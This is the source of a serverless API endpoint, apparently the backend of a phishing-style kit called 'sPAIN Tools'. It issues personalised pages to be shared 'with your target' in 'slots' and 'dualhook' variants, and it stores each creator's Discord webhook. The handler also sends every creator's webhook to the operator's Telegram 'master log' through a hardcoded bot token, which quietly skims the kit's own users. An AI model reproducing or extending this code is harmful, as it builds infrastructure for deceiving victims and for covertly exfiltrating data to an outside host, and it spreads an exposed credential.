// api/claim.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

// Upstash REST: GET /get/key
async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  return json.result; // raw string or null
}

// Upstash REST: POST /set/key/value  (value goes IN THE URL, not body)
async function redisSet(key, value) {
  const encoded = encodeURIComponent(JSON.stringify(value));
  const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}/${encoded}`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  return res.ok;
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

async function notifyDiscord(webhookUrl, embed) {
  if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'sPAIN Tools', embeds: [embed] })
    });
  } catch (_) {}
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { name, displayName, webhook, inviteUrl, charUrl, type, dualhookParent } = body || {};

  if (!name)    return res.status(400).json({ error: 'name is required' });
  if (!webhook) return res.status(400).json({ error: 'webhook is required' });

  const slug = name.trim().toLowerCase().replace(/\s+/g, '-');
  if (!/^[a-z0-9_-]+$/i.test(slug)) return res.status(400).json({ error: 'Invalid name' });

  const RESERVED = ['api', 'index', 'favicon', 'robots', 'sitemap', '_next', 'static'];
  if (RESERVED.includes(slug)) return res.status(400).json({ error: 'That name is reserved' });

  try {
    const existing = await redisGet(`slot:${slug}`);
    if (existing !== null) return res.status(200).json({ taken: true });

    const record = {
      slug:           slug,
      displayName:    displayName && displayName.trim() ? displayName.trim() : slug,
      webhook:        webhook,
      inviteUrl:      inviteUrl      || '',
      charUrl:        charUrl        || '',
      type:           type === 'dualhook' ? 'dualhook' : 'slots',
      dualhookParent: dualhookParent || '',
      createdAt:      new Date().toISOString()
    };

    const ok = await redisSet(`slot:${slug}`, record);
    if (!ok) return res.status(500).json({ error: 'Failed to save to Redis' });

    const url = `https://spain-tools.vercel.app/${slug}`;

    // Notify creator's Discord with their generated link
    await notifyDiscord(webhook, {
      title: `✅ Your ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page is ready!`,
      description: `**Share this link with your target:**\n${url}`,
      color: record.type === 'dualhook' ? 0x06b6d4 : 0xc026d3,
      fields: [
        { name: '📁 Slug', value: `\`${slug}\``, inline: true },
        { name: '🏷 Name', value: record.displayName, inline: true },
        { name: '🔗 Link', value: url, inline: false }
      ],
      footer: { text: 'sPAIN Tools — Keep this webhook private!' },
      timestamp: new Date().toISOString()
    });

    // Telegram master log
    await tgSend([
      `🆕 <b>New ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} claimed!</b>`,
      `📁 Slug: <code>${slug}</code>`,
      `🏷 Name: ${record.displayName}`,
      `🔗 URL: ${url}`,
      `📡 Webhook: <code>${webhook}</code>`,
      dualhookParent ? `🔗 DH Parent: <code>${dualhookParent}</code>` : '',
      `🕐 ${record.createdAt}`
    ].filter(Boolean).join('\n'));

    return res.status(200).json({ success: true, url, slug });

  } catch (err) {
    return res.status(500).json({ error: 'Server error', detail: err.message });
  }
}
